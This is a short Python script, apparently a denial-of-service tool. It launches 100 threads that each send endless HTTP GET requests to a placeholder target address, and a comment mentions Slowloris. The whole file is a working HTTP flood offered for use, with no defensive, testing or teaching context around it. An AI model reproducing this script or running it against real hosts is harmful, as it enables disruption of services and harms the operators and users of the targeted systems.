import requests
from threading import Thread

#put on hold. Slowloris has been solved.

url = "http://TARGET_IP"  # Replace with actual target IP or domain

def flood(thread_id):
    print(f"[+] Thread {thread_id} started.")
    while True:
        try:
            response = requests.get(url)
            print(f"[Thread {thread_id}] Sent request - Status: {response.status_code}")
        except Exception as e:
            print(f"[Thread {thread_id}] Request failed: {e}")

# Start 100 threads
for i in range(100):
    try:
        t = Thread(target=flood, args=(i,))
        t.daemon = True  # Optional: helps with clean exit
        t.start()
    except Exception as e:
        print(f"[!] Failed to start thread {i}: {e}")
